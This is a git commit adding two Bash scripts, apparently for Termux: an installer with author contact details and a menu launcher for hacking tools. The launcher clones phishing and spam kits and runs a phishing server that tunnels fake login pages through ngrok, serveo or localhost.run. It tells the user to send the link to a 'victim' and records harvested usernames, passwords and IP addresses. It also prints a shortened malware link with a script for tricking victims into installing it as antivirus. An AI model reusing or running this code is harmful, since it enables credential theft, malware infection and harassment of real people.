90135746335e040790167bd609e36c5b99fa2115
BOT CODDER <77241335+akashpatelking@users.noreply.github.com>
2021-04-30 23:42:19 +0530

    Add files via upload

---
+++ ALLHACKINGTOOL.sh
@@ -0,0 +1,68 @@
+#!/bin/bash 
+  # taking user 
+clear 
+cd $HOME/akash-patel
+chmod +x TOOL
+cp -r TOOL $PREFIX/bin
+echo -e "\e[4;34m This Script Was Created By Akash hacker \e[0m"
+echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"
+echo -e "\e[1;32m           Mail: ap258187@gmail.com \e[0m"
+echo -e "\e[1;32m       Whatsapp: 7079063261............... \e[0m"
+clear 
+ echo -e "\e[1;31m"
+figlet ALLTOOL
+echo -e "\e[1;34m Created By \e[1;32m"
+toilet -f mono12 -F border AKASH
+echo -e "\e[1;32m [ CONTANT ANY PROBLEM ]\e[0m"
+echo -e "\e[1;32m [ Whatsapp =+237 7079063261 ] \e[0m"
+echo -e "\e[1;32m [ Whatsapp =+91 8791334748 ] \e[0m"
+echo -e "\e[1;32m [ MAIN HACKER { 91 } ↑↑↑↑↑↑ ] \e[0m"
+
+echo -e "\e[1;32m [ CODDEDBYAKASHHACKER ]\e[0m"
+echo -e "\e[1;32m [100+TOOL COMMING SOON ]\e[0m"
+echo -e "\e[1;32m [ EDUCATONAL ONLY     ]\e[0m"
+echo -e "\e[1;32m [ READ Instruction    ]\e[0m"
+echo -e "\e[1;32m [ #######Youtube : AKASH GAMER Hacker  ]\e[0m"
+
+echo -e "\e[1;32m [Whatsapp GROUP = https://chat.whatsapp.com/KwwhoAwZhAA54zw2sB9CAd ]\e[0m"
+echo -e "\e[1;32m [ BYY BYY BYY BYY BYY BYY ]  \e[0m" #######Youtube : AKASH GAMER Hacker
+echo -e "\e[1;32m →→→→→→→→CONTANT ANY PROBLEM←←←←←\e[0m"
+echo -e "\e[1;32m       AKASH HACKER  \e[0m"
+clear
+xdg-open https://youtube.com/channel/UCi9kS7X5E7knfhbFMrwsb4Q
+clear 
+
+echo -e "\e[0;31m[1]\e[32m →→→→→→→→→→ INSTALL TOOL "
+echo -e "\e[0;31m[2]\e[32m →→→→→→→→→→ EXIT "
+read -p "AKASH HACKER : " AKASH
+if [[ $AKASH == 1 || $AKASH == 01 ]]; then 
+clear
+echo -e "\e[34mINSTALLING PROCESS  WAIT 5 min ...........]\e[0m"
+cd $HOME
+
+pkg install python -y >/dev/null 2>&1
+pkg install python2 -y >/dev/null 2>&1
+pkg install php -y >/dev/null 2>&1
+pkg install git -y >/dev/null 2>&1
+pkg install wget -y >/dev/null 2>&1
+pip install lolcat >/dev/null 2>&1
+pkg install figlet >/dev/null 2>&1
+pkg install toilet >/dev/null 2>&1
+sleep 2
+
+clear
+echo -e "\e[1;32m SUCCES \e[0m"
+sleep 2
+clear
+echo -e '\033[31;40;1m BOT CODDER ....'
+sleep 2
+clear
+echo -e "\e[1;32m TOOL INSTALL SUCCESFULL 
+         GO TO YOUR TERMINAL TYPE
+                 [ TOOL ]\e[0m"
+sleep 2
+exit 1
+elif [[ $AKASH == 2 || $AKASH  == 02 ]]; then
+clear
+exit 1
+fi
---
+++ BOT.sh
@@ -0,0 +1,494 @@
+#!/bin/bash
+xdg-open https://youtube.com/channel/UCi9kS7X5E7knfhbFMrwsb4Q
+trap 'printf "\n";stop;exit 1' 2
+deps() {
+clear 
+
+}
+banner() {
+clear
+}
+
+menu() {
+printf "\e[0m\n"
+toilet -f mono12 -F border BOT
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m01\e[0m\e[1;31m]\e[0m\e[1;33m SHOW TOOL\e[0m\n"
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m02\e[0m\e[1;31m]\e[0m\e[1;33m POPURAL TOOL\e[0m\n"
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m03\e[0m\e[1;31m]\e[0m\e[1;33m UPDATE TOOL\e[0m\n"
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m04\e[0m\e[1;31m]\e[0m\e[1;33m SUPPORT\e[0m\n"
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m05\e[0m\e[1;31m]\e[0m\e[1;33m CONTANT\e[0m\n"
+printf "\e[0m\e[1;31m  [\e[0m\e[1;37m06\e[0m\e[1;31m]\e[0m\e[1;33m EXIT\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m BOT =  \e[0m\e[1;32m\en' BOT
+                                                                                                                                                                                                                                                       
+if [[ $BOT == 1 || $BOT == 01 ]]; then
+open
+elif [[ $BOT == 2 || $BOT == 02 ]]; then
+popular
+elif [[ $BOT == 3 || $BOT == 03 ]]; then
+clear
+printf "\e[34mINSTALLING PROCESS  WAIT 5 min ...........]\e[0m"
+cd $HOME
+rm -rf akash-patel
+
+        git clone https://github.com/akashpatelking/akash-patel >/dev/null 2>&1
+        printf  "\e[1;32m SUCCES \e[0m"
+        sleep 5
+        clear
+ menu 
+elif [[ $BOT == 4 || $BOT == 04 ]]; then
+xdg-open https://youtube.com/channel/UCi9kS7X5E7knfhbFMrwsb4Q
+clear
+menu
+elif [[ $BOT == 5 || $BOT == 05 ]]; then
+xdg-open https://wa.me/917079063261
+clear 
+menu  
+elif [[ $BOT == 6 || $BOT == 06 ]]; then
+exit 
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+open(){       
+clear
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m T-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m BLACK EYE ( PHISHING PAGE )  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m M-wiz ( meta sploit fame work )  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m HAMMER  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m08\e[0m\e[1;31m]\e[0m\e[1;93m HIDDEN EYE  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m09\e[0m\e[1;31m]\e[0m\e[1;93m kalimux  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m10\e[0m\e[1;31m]\e[0m\e[1;93m Ip DRONE  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m LAZY BEE  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m12\e[0m\e[1;31m]\e[0m\e[1;93m OPTIVA-framework  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m13\e[0m\e[1;31m]\e[0m\e[1;93m SEEKER  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m14\e[0m\e[1;31m]\e[0m\e[1;93m TUNNEL  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m15\e[0m\e[1;31m]\e[0m\e[1;93m BASSIC COMMEND \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m16\e[0m\e[1;31m]\e[0m\e[1;93m INSTAGRAM HACK  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m17\e[0m\e[1;31m]\e[0m\e[1;93m Malicious (virus)  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m18\e[0m\e[1;31m]\e[0m\e[1;93m HAX-RAT  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m19\e[0m\e[1;31m]\e[0m\e[1;93m cred map  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m20\e[0m\e[1;31m]\e[0m\e[1;93m Admin panel  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m Email bomber  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m22\e[0m\e[1;31m]\e[0m\e[1;93m Black box  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m23\e[0m\e[1;31m]\e[0m\e[1;93m Little brother  \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m24\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m25\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m26\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m27\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m28\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m29\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m30\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m31\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m32\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m33\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m34\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m35\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m36\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m37\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m38\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m39\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m40\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m41\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m42\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m43\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m44\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m45\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m46\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m47\e[0m\e[1;31m]\e[0m\e[1;93m SNAP ( Termux restore ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m48\e[0m\e[1;31m]\e[0m\e[1;93m FT-BOMB ( SMS & CALL ) \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m49\e[0m\e[1;31m]\e[0m\e[1;93m TOOL-X \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m50\e[0m\e[1;31m]\e[0m\e[1;93m T-LOAD \e[0m\n"
+clear
+
+cd $HOME/akash-patel
+bash ALLTOOL
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m BOT =  \e[0m\e[1;96m\en' option
+if [[ $option == 1 || $option == 01 ]]; then
+clear
+printf "\e[34mINSTALLING PROCESS  WAIT 5 min ...........]\e[0m"
+ cd $HOME
+        git clone https://github.com/Rajkumrdusad/Tool-X >/dev/null 2>&1
+    printf  "\e[1;32m SUCCES \e[0m"
+    sleep 2
+open 
+elif [[ $option == 2 || $option == 02 ]]; then
+server="fb_advanced"
+start
+elif [[ $option == 3 || $option == 03 ]]; then
+server="fb_security"
+start
+elif [[ $option == 4 || $option == 04 ]]; then
+server="fb_messenger"
+start
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+popular(){
+clear
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Zphisher { hack any social media Account } \e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m palyod creat { phone hack }\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m send link virus { phone crack }\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Red hwak { websites hack }\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m watsaap spam { unlimited } \e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m BOT =  \e[0m\e[1;96m\en' option
+if [[ $option == 1 || $option == 01 ]]; then
+clear
+printf "\e[34mINSTALLING PROCESS  WAIT 5 min ...........]\e[0m"
+cd $HOME
+git clone https://github.com/htr-tech/zphisher >/dev/null 2>&1
+   printf  "\e[1;32m SUCCES \e[0m"
+    sleep 5
+    clear
+menu 
+elif [[ $option == 2 || $option == 02 ]]; then
+server="ig_followers"
+start
+elif [[ $option == 3 || $option == 03 ]]; then
+clear
+printf "Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
+👇👇👇
+
+L1NK :- https://bit.ly/3fX8ljZ
+
+👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script"
+sleep 10 
+popular 
+elif [[ $option == 4 || $option == 04 ]]; then
+clear
+cd $HOME
+git clone https://github.com/Tuhinshubhra/RED_HAWK >/dev/null 2>&1
+   printf  "\e[1;32m SUCCES \e[0m"
+    sleep 5
+popular
+elif [[ $option == 5 || $option == 05 ]]; then
+clear
+printf "\e[34mINSTALLING PROCESS  WAIT 5 min ...........]\e[0m"
+cd $HOME
+pkg install python -y >/dev/null 2>&1
+pkg install python3 -y >/dev/null 2>&1
+pkg install git -y >/dev/null 2>&1
+python3 -m pip install requests -y >/dev/null 2>&1
+git clone https://github.com/akas-bot/SpamWa-1 >/dev/null 2>&1
+
+   printf  "\e[1;32m SUCCES \e[0m"
+    sleep 5
+clear
+    popular
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+gmail(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
+if [[ $option == 1 || $option == 01 ]]; then
+server="google"
+start
+elif [[ $option == 2 || $option == 02 ]]; then
+server="google_new"
+start
+elif [[ $option == 3 || $option == 03 ]]; then
+server="google_poll"
+start
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+vk(){
+printf " \n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
+printf "\e[0m\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' option
+if [[ $option == 1 || $option == 01 ]]; then
+server="vk"
+start
+elif [[ $option == 2 || $option == 02 ]]; then
+server="vk_poll"
+start
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+menu
+fi
+}
+stop() {
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+}
+start() {
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m LocalHost\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Localhost.run\e[0m\n"
+d_o_server="2"
+printf "\n"
+read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
+option_server="${option_server:-${d_o_server}}"
+if [[ $option_server == 3 || $option_server == 03 ]]; then
+start_s
+elif [[ $option_server == 2 || $option_server == 02 ]]; then
+start_n
+elif [[ $option_server == 4 || $option_server == 04 ]]; then
+start_local
+elif [[ $option_server == 1 || $option_server == 01 ]]; then
+start_l
+else
+printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
+sleep 1
+banner
+start
+fi
+}
+start_s() {
+if [[ -e websites/$server/ip.txt ]]; then
+rm -rf websites/$server/ip.txt
+fi
+if [[ -e websites/$server/usernames.txt ]]; then
+rm -rf websites/$server/usernames.txt
+fi
+def_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+start_serveo
+}
+start_serveo() {
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
+printf "\n"
+sleep 7
+send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
+printf "\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $send_url
+printf "\n"
+found
+}
+start_n() {
+if [[ -e websites/$server/ip.txt ]]; then
+rm -rf websites/$server/ip.txt
+fi
+if [[ -e websites/$server/usernames.txt ]]; then
+rm -rf websites/$server/usernames.txt
+fi
+if [[ -e ngrok ]]; then
+echo ""
+else
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:5555\e[0m\e[1;92m)\e[0m\n"
+arch=$(uname -a | grep -o 'arm' | head -n1)
+arch2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+if [[ -e ngrok-stable-linux-arm.zip ]]; then
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+else
+printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
+exit 1
+fi
+else
+curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+printf " \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;93m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Please Install All Packges.\e[0m\n"
+exit 1
+fi
+fi
+fi
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
+cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+sleep 2
+./ngrok http 5555 > /dev/null 2>&1 &
+sleep 10
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
+found
+}
+start_local(){
+def_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
+printf "\n"
+if [[ -e linksender ]]; then
+rm -rf linksender
+fi
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
+printf "\e[1;93m\n"
+ssh -R 80:localhost:$port ssh.localhost.run 2>&1
+printf "\e[0m\n"
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
+while [ true ]; do
+if [[ -e "websites/$server/ip.txt" ]]; then
+c_ip
+rm -rf websites/$server/ip.txt
+fi
+sleep 0.75
+if [[ -e "websites/$server/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
+rm -rf websites/$server/usernames.txt
+fi
+sleep 0.75
+done
+}
+start_l() {
+def_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
+printf "\n"
+found
+}
+found() {
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf "\n"
+while [ true ]; do
+if [[ -e "websites/$server/ip.txt" ]]; then
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found!\n"
+printf "\n"
+c_ip
+rm -rf websites/$server/ip.txt
+fi
+sleep 0.75
+if [[ -e "websites/$server/usernames.txt" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;92m Login info Found !!\n"
+printf "\n"
+c_cred
+rm -rf websites/$server/usernames.txt
+fi
+sleep 0.75
+done
+}
+c_ip() {
+touch websites/$server/login_info.txt
+ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP:\e[0m\e[1;96m %s\e[0m\n" $ip
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/victim_ip.txt\e[0m\n" $server
+printf "\n"
+cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
+}
+c_cred() {
+account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m websites/%s/login_info.txt\e[0m\n" $server
+printf "\n"
